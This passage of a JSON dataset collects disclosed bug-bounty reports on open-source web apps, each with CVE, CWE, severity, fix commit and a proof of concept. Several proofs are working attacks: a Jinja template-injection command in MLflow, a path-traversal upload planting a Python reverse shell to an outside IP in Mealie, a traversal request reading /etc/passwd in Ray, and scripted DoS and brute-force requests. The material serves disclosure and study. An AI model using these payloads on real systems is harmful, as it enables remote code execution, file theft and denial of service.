lhc_vid=6329efff387471209bb0; fsNick=admin; fsLogkey=NitRWJcUvIn12gjh8kVKazD07MsuqHmxeXAT45fCyLpGbPElZBrOw3dSFYQo96; fsLang=en_EN; fsCompany=1; csrftoken=RlWHrJOqodNZ9lTk6N6WUMhBTQ2LVNhZVDSEs3tOHSx4eI3bbXnNQ2Wfz6IkargL\nConnection: close\nResponse on successful guess:\nHTTP/1.1 302 Found\nDate: Thu, 19 Jan 2023 21:27:50 GMT\nServer: WSGIServer/0.2 CPython/3.9.16\nContent-Type: text/html; charset=utf-8\nLocation: /dashboard/\nExpires: Thu, 19 Jan 2023 21:27:50 GMT\nCache-Control: max-age=0, no-cache, no-store, must-revalidate, private\nX-Frame-Options: SAMEORIGIN\nVary: Accept-Language, Cookie\nContent-Language: en\nContent-Length: 0\nSet-Cookie:  csrftoken=JGu3cD6SKchdVSkBFRUiofpt0h8Z6P5OLf3DRmWzKHNkaVhLUDNKFlcTg2uACDs4; expires=Thu, 18 Jan 2024 21:27:50 GMT; Max-Age=31449600; Path=/; SameSite=Lax\nSet-Cookie:  sessionid=0mah6hyvojbt7cbjh06sksu61sj4tnay; HttpOnly; Path=/; SameSite=Lax\nImpact\nThe impact is unlimited password attempts leading to Brute Force attacks on the login page. Should this software be hosted on a website, it may also lead to Denial of Service."}, "https://huntr.com/bounties/f0d85efa-4e78-4b1d-848f-edea115af64b/": {"cve": "CVE-2022-2650", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2650", "cwe": "CWE-307: Improper Restriction of Excessive Authentication Attempts", "cwe_link": "https://cwe.mitre.org/data/definitions/307.html", "severity_score": "High (7.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/wger-project/wger", "fix_commit": "https://www.github.com/wger-project/wger/commit/5e3167e3a2dc95836fa2607fe201524c031a2c4c", "description": "Description\nWger Workout Manager does not limit unsuccessful login attempts allowing Brute Forcing.\nProof of Concept\nSteps to Reproduce:\nRegister a new user\nLogout\nSend a login request with an incorrect password\nCapture the login request\nReplay the login request with a different password value utilizing a password list payload\nShould the password exist in the password list, a FOUND \"Reason\" with a Code of \"300\" will be issued\nZAP will continue attempting all passwords in the password list until complete\nOWASP ZAP (Zed Attack Proxy) captured request below\nPOST http://localhost:8002/en/user/login HTTP/1.1\nHost: localhost:8002\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 134\nOrigin: https://localhost:8002\nConnection: keep-alive\nReferer: https://localhost:8002/en/user/login\nCookie: csrftoken=dmYHzhEL7jtry2rAuRuXFvfRNfr1ZhKELoaBcBHiD21rMHik5aAno2aJ44SloIAq; sessionid=ezv3ryk6pdpjsruystkuy9igz6nvjcwg\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\ncsrfmiddlewaretoken=6XFt2tC2nJ1s57MtQOmsiBqDnWHylBfBEZRnFNFzTszsjMDdr7sS18lvEL8SK25n&username=username1&password=password&submit=Login\nImpact\nThe impact is unlimited password attempts leading to Brute Force attacks on the login page. Should this software be hosted on a website, it may also lead to Denial of Service."}, "https://huntr.com/bounties/126d7ecd-73c3-4d9f-892a-5201a3e0e5ca/": {"cve": "", "cve_link": "", "cwe": "CWE-307: Improper Restriction of Excessive Authentication Attempts", "cwe_link": "https://cwe.mitre.org/data/definitions/307.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/b3c41a4bd0033ee5af14cd543c4ad9a6da2cf06b", "description": "Description\nThe login page doesn't have any protection against a brute-force password attack, which allows an attacker to try every possible combination without any restriction.\nProof of Concept\n1 - Send a login request of the target user\nPOST /api/auth/token HTTP/1.1\nHost: localhost:9091\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryLDx5Wjaf8w8QGFao\n\n------WebKitFormBoundaryLDx5Wjaf8w8QGFao\nContent-Disposition: form-data; name=\"username\"\n\nadmin@email.com\n------WebKitFormBoundaryLDx5Wjaf8w8QGFao\nContent-Disposition: form-data; name=\"password\"\n\npassword\n------WebKitFormBoundaryLDx5Wjaf8w8QGFao\nContent-Disposition: form-data; name=\"remember_me\"\n\nfalse\n------WebKitFormBoundaryLDx5Wjaf8w8QGFao--\n2 - Capture and replay the login request with a different password everytime\nImpact\nAn attacker could perform a brute-force attack targeting normal and administrative users, using different passwords and eventually gain access to the targeted account, without any restriction."}, "https://huntr.com/bounties/687e9593-241b-48f4-8e85-5314fc85b170/": {"cve": "", "cve_link": "", "cwe": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames", "cwe_link": "https://cwe.mitre.org/data/definitions/1021.html", "severity_score": "Medium (6.8)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/demindiro/agreper", "fix_commit": "https://www.github.com/demindiro/agreper/commit/09f56bd1fe8ca0af015ce10d8b41a3d65c454b59", "description": "Description\nIt can be possible to perform a clickjacking attack due to the lack of frame restrictions. The application does not set the response header X-Frame-Options: DENY.\nProof of Concept\nhttp://localhost:8000/admin/\nResponse headers\nHTTP/1.1 200 OK\nServer: gunicorn\nDate: Tue, 24 Jan 2023 02:26:23 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\nContent-Length: 3922\nVary: Cookie\nSet-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoxfQ.Y89Bzw.VbjbkgJ5kmuUVdpTYYS2rQDJyV8; Expires=Fri, 24 Feb 2023 02:26:23 GMT; HttpOnly; Path=/\nImpact\nAccording to PortSwigger references, it is possible for a page controlled by an attacker to load the website within an iframe. This will enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery and may result in unauthorized actions."}, "https://huntr.com/bounties/12b64f91-d048-490c-94b0-37514b6d694d/": {"cve": "CVE-2023-0057", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0057", "cwe": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames", "cwe_link": "https://cwe.mitre.org/data/definitions/1021.html", "severity_score": "Low (3.1)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/bd2a31b7de54570b919aa1581d486e6ee18c0f64", "description": "Description\nIt can be possible to perform a clickjacking attack due to the lack of frame restrictions. The application does not set the response header X-Frame-Options: DENY.\nProof of Concept\nImpact\nAccording to PortSwigger references, it is possible for a page controlled by an attacker to load the website within an iframe. This will enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery and may result in unauthorized actions."}, "https://huntr.com/bounties/e5c2625b-34cc-4805-8223-80f2689e4e5c/": {"cve": "CVE-2022-3167", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3167", "cwe": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames", "cwe_link": "https://cwe.mitre.org/data/definitions/1021.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/7294bb7466532762c93d711211e5958940c1b428", "description": "Description\nClickjacking is a portmanteau of two words \u2018click\u2019 and \u2018hijacking\u2019. It refers to hijacking user\u2019s click for malicious intent. In it, an attacker embeds the vulnerable site in an transparent iframe in attacker\u2019s own website and overlays it with objects such as button using CSS skills. This tricks users to perform unintended actions on vulnerable website, thinking they are doing those on attacker\u2019s website. Clickjacking, also known as a \"UI redress attack\".\nProof of Concept\n1. Go to this URL: https://clickjacker.io/test?url=https:%2F%2Frdiffweb-demo.ikus-soft.com%2Flogin%2F\n2. Observe that the website is getting embeded in an Iframe.\n3. Observe that the headers x-frame-options and content-security-policy frame ancestors are missing.\nImpact\nUsers are tricked into performing all sorts of unintended actions are such as typing in the password, clicking on \u2018Delete my account\u2019 button, liking a post, deleting a post, commenting on a blog. In other words all the actions that a normal user can do on a legitimate website can be done using clickjacking."}, "https://huntr.com/bounties/af3101d7-fea6-463a-b7e4-a48be219e31b/": {"cve": "CVE-2023-0227", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0227", "cwe": "CWE-613: Insufficient Session Expiration", "cwe_link": "https://cwe.mitre.org/data/definitions/613.html", "severity_score": "High (8.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/c035714c0596b704b11af0f8a669352f128ad2d9", "description": "Description\nThe session is not expiring in another browser if we delete the user.\nProof of Concept\nCreate two users with an admin role for the POC\nLogin in two different browsers Firefox (user A ) and Chrome (user B) respectively\nGo the settings->users and delete user B from user A Firefox browser\nUser B cookie is still logged in in Chrome and can still access everything\nImpact\nEven after deleting the user he/she can create again the user for himself/herself, and can perform everything."}, "https://huntr.com/bounties/ca428c31-858d-47fa-adc9-2a59f8e8b2b1/": {"cve": "CVE-2022-3362", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3362", "cwe": "CWE-613: Insufficient Session Expiration", "cwe_link": "https://cwe.mitre.org/data/definitions/613.html", "severity_score": "Medium (6.1)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/6efb995bc32c8a8e9ad755eb813dec991dffb2b8", "description": "Description\nOn changing password both session using which user changes password and old sessions in any other browser or device does not expire and remains active\nProof of Concept\n1.Go to https://rdiffweb-dev.ikus-soft.com/login/ and login into same account using browser A and B\n2.From Browser B  change password associated with your account\n3.Notice that Session on Browser A will remain active and does not expire.\n\n\n\n\n\n# Impact\n\nAll active sessions must expire on password change to revoke access from attacker if account is compromised"}, "https://huntr.com/bounties/d27d232b-2578-4b32-b3b4-74aabdadf629/": {"cve": "CVE-2022-2888", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2888", "cwe": "CWE-613: Insufficient Session Expiration", "cwe_link": "https://cwe.mitre.org/data/definitions/613.html", "severity_score": "Medium (4.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/40e6217ac1a85cc5ed592873ae49db01d3005da4", "description": "Description\nInsufficient Session Expiration is when a website permits an attacker to reuse old session credentials or session IDs for authorization.\nProof of Concept\nSteps to reproduce\n1- Login into http://127.0.0.1:5000/login/ (OctoPrint).\n2- Open browser in the incognito tab or open another browser and login with the same user.\n3- In step 1 change the password and login again.\n4- In step 2 the old session is still valid, it must expire. \nImpact\nAn attacker can use old session credentials or session IDs for authorization."}, "https://huntr.com/bounties/da6745e4-7bcc-4e9a-9e96-0709ec9f2477/": {"cve": "CVE-2022-2930", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2930", "cwe": "CWE-620: Unverified Password Change", "cwe_link": "https://cwe.mitre.org/data/definitions/620.html", "severity_score": "Medium (5.3)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/1453076ee3e47fcab2dc73664ec2d61d3ef7fc4f", "description": "Description\nThe user password change page, doesn't require knowledge of the existing password.\nProof of Concept\nLog in as a normal user\nGo to the User Dashboard page and click User Settings.\nSet a any new password.\nClick confirm\nThe password is changed successfully.\nImpact\nAn attacker that gains access to an active user session, can change the account password without previous knowledge of the current password."}, "https://huntr.com/bounties/1be328aa-7a3d-4690-9c65-961cb273a917/": {"cve": "", "cve_link": "", "cwe": "CWE-620: Unverified Password Change", "cwe_link": "https://cwe.mitre.org/data/definitions/620.html", "severity_score": "High (7)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/137311e006db1fada52cc53bee1943fc9b2f271a", "description": "Description\nWhen setting a new user password it does not require knowledge of the original password (Current password not required)\nProof of Concept\n1. Log in as a regular user \n2. Navigate: https://book.dansmonorage.blue/preferences/password\n3. Enter any password string.\nImpact\nIf an attacker can gain access to an active user session (i.e. accessing terminal when user stands up), it would not be necessary to know the victim's current password in order to fully compromise the account."}, "https://huntr.com/bounties/a64c197c-9960-410c-ac02-7a46b09bc9b7/": {"cve": "", "cve_link": "", "cwe": "CWE-620: Unverified Password Change", "cwe_link": "https://cwe.mitre.org/data/definitions/620.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/b9c9f5b813c5da57360d0b2cd89a680692913317", "description": "Description\nWhen setting a new user password, InvenTree does not require knowledge of the original password or using another form of authentication.\nProof of Concept\n1. Log in as a regular user \n2. Go to the account settings link\n3. Select Set Password\n4. Enter any 8-character password string (this form is not constrained by the common passwords blocked in initial user creation).\nImpact\nIf an attacker can gain access to an active user session (i.e. accessing terminal when user stands up), it would not be necessary to know the victim's current password in order to fully compromise the account."}, "https://huntr.com/bounties/9e4cc07b-6fff-421b-89bd-9445ef61d34d/": {"cve": "CVE-2023-6709", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6709", "cwe": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine", "cwe_link": "https://cwe.mitre.org/data/definitions/1336.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/432b8ccf27fd3a76df4ba79bb1bec62118a85625", "description": "\ud83d\udd12\ufe0f Requirements\nThe user must load a recipe configuration that he found on the internet.\n  \ud83d\udcdd Description\nAs described in the MLFlow documentation, the library allows to create recipes (source). As described into it, it can be used this way:\n1. Git clone the recipes-regression-template repository:\ngit clone https://github.com/mlflow/recipes-regression-template\n2. Use it in a run:\nimport os\nfrom mlflow.recipes import Recipe\nfrom mlflow.pyfunc import PyFuncModel\n\nos.chdir(\"~/recipes-regression-template\")\nregression_recipe = Recipe(profile=\"local\")\n# Run the full recipe\nregression_recipe.run()\n# Inspect the model training results\nregression_recipe.inspect(step=\"train\")\n# Load the trained model\nregression_model_recipe: PyFuncModel = regression_recipe.get_artifact(\"model\")\nWhen loading the recipe, it triggers the following execution flow:\n1. Trigger __new__: (permalink)\ndef __new__(cls, profile: str):\n    # ...\n    recipe_config = get_recipe_config(recipe_root_path=recipe_root_path, profile=profile)\n    recipe = recipe_config.get(\"recipe\")\n2. Get the recipe config via get_recipe_config: (permalink)\ndef get_recipe_config(recipe_root_path: str = None, profile: str = None) -> Dict[str, Any]:\n    # ...\n    if profile:\n        # ...\n        return render_and_merge_yaml(\n            recipe_root_path, _RECIPE_CONFIG_FILE_NAME, profile_relpath\n        )\n    else:\n        return read_yaml(recipe_root_path, _RECIPE_CONFIG_FILE_NAME)\n3. In case of a profile, it will call render_and_merge_yaml to render and merge profile / recipe yaml file: (permalink)\ndef render_and_merge_yaml(root, template_name, context_name):\n    # ...\n    j2_env = jinja2.Environment(\n        loader=jinja2.FileSystemLoader(root, encoding=ENCODING),\n        undefined=jinja2.StrictUndefined,\n        line_comment_prefix=\"#\",\n    )\n\n    # ...\n    context_source = j2_env.get_template(context_name).render({}) # <--- HERE IS THE ISSUE\n    context_dict = yaml.load(context_source, Loader=UniqueKeyLoader) or {}\n\n    # Substitute parameters from context dict into template\n    source = j2_env.get_template(template_name).render(context_dict)\n\n    rendered_template_dict = yaml.load(source, Loader=UniqueKeyLoader)\n    return merge_dicts(rendered_template_dict, context_dict)\nIn order to \"render\" and \"merge\", the jinja library is used without using any sandbox. Due to this, in case a user loads a recipe configuration that he found on the internet, it might result in a code execution!\n  \ud83d\udca5 Proof of Concept\n1. Create the following directory arborescence:\n.\n\u251c\u2500\u2500 recipes\n\u2502   \u251c\u2500\u2500 profiles\n\u2502   \u2502   \u2514\u2500\u2500 local.yaml\n\u2502   \u2514\u2500\u2500 recipe.yaml\n\u2514\u2500\u2500 run.py\n2. Fill local.yaml with whatever you want.\n3. Fill recipe.yaml with:\nrecipe: \"regression/v1\"\ntarget_col: {{ cycler.__init__.__globals__.os.system(\"id > /tmp/rce\") }}\n4. Execute run.py with:\nimport os\nfrom mlflow.recipes import Recipe\n\nos.chdir(\"./recipes\")\nregression_recipe = Recipe(profile=\"local\")\n5. You should see that /tmp/rce file has been created:\n  \ud83d\uddbc\ufe0f Models Impact\nAs the vulnerability results in a command execution, models are impacted at all levels.\n  \ud83d\udee0\ufe0f Fix suggestion\nFollowing palletsprojects's security concerns about untrusted template, you should use a sandbox.\nfrom jinja2.sandbox import SandboxedEnvironment\n\nenv = SandboxedEnvironment()\n\nname = \"hello\"\nenv.from_string(\"{{ name }}\").render(name=name)\nThis way, code execution shouldn't be possible anymore.\nImpact\nIn case a user loads a malicious user's recipe config, he could abuse this issue to execute code on the victim's machine."}, "https://huntr.com/bounties/3ecd4a78-523e-4f84-a3fd-31a01a68f142/": {"cve": "", "cve_link": "", "cwe": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine", "cwe_link": "https://cwe.mitre.org/data/definitions/1336.html", "severity_score": "Critical (9.9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/13850cda1f9cb02a8c788030ba6cfa96bba33571", "description": "Description\nArbitrary File Write\nReproduction Steps:\nAs a low privileged user, Create a new recipe and click on the \"+\" to add a New Asset.\nSelect a file, then proxy the request that will create the asset.\nUpdate the values in the POST request to the ones shown below:\nPOST /api/recipes/bruno-s-recipe/assets HTTP/1.1\nHost: localhost:9091\nContent-Length: 742\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"\nAccept-Language: en-US\nsec-ch-ua-mobile: ?0\nAuthorization: Bearer CHANGEME\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryn8YeOw58f3yZd2Am\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nOrigin: http://localhost:9091\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:9091/recipe/bruno-s-recipe\nAccept-Encoding: gzip, deflate\nCookie: auth.strategy=local; i18n_redirected=en-US; auth._token.local=CHANGEME; auth._token_expiration.local=1656569483000\nConnection: close\n\n------WebKitFormBoundaryn8YeOw58f3yZd2Am\nContent-Disposition: form-data; name=\"file\"; filename=\"pwn.txt\"\nContent-Type: text/plain\n\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('python3 -c \\'import os,pty,socket;s=socket.socket();s.connect((\"172.17.0.1\",53));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\\'').read() }}\n------WebKitFormBoundaryn8YeOw58f3yZd2Am\nContent-Disposition: form-data; name=\"name\"\n\n$\n------WebKitFormBoundaryn8YeOw58f3yZd2Am\nContent-Disposition: form-data; name=\"extension\"\n\n./../../../../../../../app/data/templates/pwn.html\n------WebKitFormBoundaryn8YeOw58f3yZd2Am\nContent-Disposition: form-data; name=\"icon\"\n\nmdi-file\n------WebKitFormBoundaryn8YeOw58f3yZd2Am--\nNOTE: Since I was running Mealie v1.0.0beta-3 with docker-compose my IP address in the payload above is 172.10.0.1. If you are running Mealie in a different way then you would have to change that IP address to your IP address e.g. eth0 interface.\nSince mealie/routes/recipe/recipe_crud_routes.py:306 is calling slugify on the name POST parameter, we use $ which slugify() will remove completely.\nSince mealie/routes/recipe/recipe_crud_routes.py:306 is concatenating raw user input from the extension POST parameter into the variable file_name, which ultimately gets used when writing to disk, we can use a directory traversal attack in the extension (e.g. ./../../../tmp/pwn.txt) to write the file to arbitrary location on the server.\nAs an attacker, now that we have a strong attack primitive, we can start getting creative to get RCE. Since the files were being created by root, we could add an entry to /etc/passwd, create a crontab, etc. but since there was templating functionality in the application that peaked my interest. The PoC in the HTTP request above creates a Jinja2 template at /app/data/template/pwn.html. Since Jinja2 templates execute Python code when rendered, all we have to do now to get code execution is render the malicious template. This was easy enough.\nCode Execution via Template Rendering\nReproduction Steps:\nCreate an API key for your low privilege user.\nStart a nc listener with nc -lvnp 53.\nMake an API call to /api/recipes/{slug}/exports?template_name=evil_template.html\nPoC:\nGET /api/recipes/recipe-2/exports?template_name=pwn.html HTTP/1.1\nHost: localhost:9091\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"\naccept: */*\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:9091/docs\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nAuthorization: Bearer CHANGEME\nCookie: auth.strategy=local; i18n_redirected=en-US; auth._token.local=Bearer CHANGEME; auth._token_expiration.local=1656569483000\nConnection: close\nIf everything was done correctly, you will receive a connection to your listener and have a reverse shell. You now have remote access as root to the server running Mealie.\nImpact\nAn attacker who is able to execute such a flaw is able to execute commands with the privileges of the programming language or the web server. In this case, since the attacker is root in a Docker container they can execute system commands, read/modify databases, attack adjacent systems. This flaw leads to a complete compromise of the system."}, "https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/": {"cve": "CVE-2023-6020", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6020", "cwe": "CWE-862: Missing Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/862.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ray-project/ray", "fix_commit": "https://www.github.com/ray-project/ray/commit/542ca642f51674ed78f7291764e3b1475fc4be2b", "description": "Description\nLocal file include allows remote attackers to make an unauthenticated API call and read any file on the system, such as SSH keys.\nProof of Concept\nGET /static/js/../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: localhost:8265\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://localhost:8265/\nSec-Fetch-Dest: script\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\n\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nEtag: \"174880dae894b157-2020\"\nLast-Modified: Thu, 02 Mar 2023 04:48:59 GMT\nContent-Length: 8224\nAccept-Ranges: bytes\nDate: Thu, 24 Aug 2023 23:01:58 GMT\nServer: Python/3.8 aiohttp/3.8.5\nConnection: close\n\n##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\nfakeuser:*:99:99:Fake User:/Users/danmcinerney/fakeuser:/bin/sh\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n[...]\nImpact\nAllows attackers to read any file on the server depending on the permissions Ray was run with."}, "https://huntr.com/bounties/3b712cb6-3fa3-4f71-8562-7a7016c6262e/": {"cve": "", "cve_link": "", "cwe": "CWE-400: Denial of Service", "cwe_link": "https://cwe.mitre.org/data/definitions/400.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/761305d04f5910ba14cc04d1255a8f1afdbb87f3", "description": "Description\nI can use this attack to take advantage of the reset password confirmation mechanism and send a large number of emails to anyone simply because I know his email address, as well as perform a DoS attack by draining the resources of the SMTP service and the web server.\nProof of Concept\n// PoC.js\nhttps://1drv.ms/v/s!AjTDEH9wRz1ugRE6IG1N-CHkvXml?e=mhTsF6\nImpact\nI can deny service, and the server will drain the SMTP resources and flood the email inboxes of any user for whom I have his email, and all of his email will be sent from the kiwitcms.org site, destroying the company's reputation."}, "https://huntr.com/bounties/57b0f272-a97f-4cb3-b546-c863c68a561a/": {"cve": "CVE-2022-2134", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2134", "cwe": "CWE-400: Denial of Service", "cwe_link": "https://cwe.mitre.org/data/definitions/400.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/63b4ff3eb6e80861962fafe79c9b483cd7239d6c", "description": "Description\nThe InvenTree application allows for the inclusion of notes for various objects in the application. The notes functionality does not include a character limit. An attacker can submit an infinite number of characters into the notes section, which causes a denial of service and increased processor usage for the victim. The tester tested against the Stock Parts and Parts notes sections. Tester assumes that other objects in the application that have notes available would also be vulnerable, however did not test it due to consumption of local resources.\nTester was able to add in excess of one hundred million (100,000,000) characters or more with the included PoC during testing.\nProof of Concept\nimport requests as request_handler\n\nburp0_url = \"http://192.168.1.5:8000/api/part/1/\"\nburp0_cookies = {\"csrftoken\": \"L433DJ0Xtp97EpAMROtkIyLX8KZsXWUxGYHZTcUET4WXL0EtbqgZYydelin9y4G7\", \"sessionid\": \"un2jcwzkr7ofla5c3vmfwfjw7z38blj3\"}\nburp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\", \"Accept\": \"application/json, text/javascript, */*; q=0.01\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://192.168.1.5:8000/part/1/\", \"Content-Type\": \"application/json\", \"X-CSRFToken\": 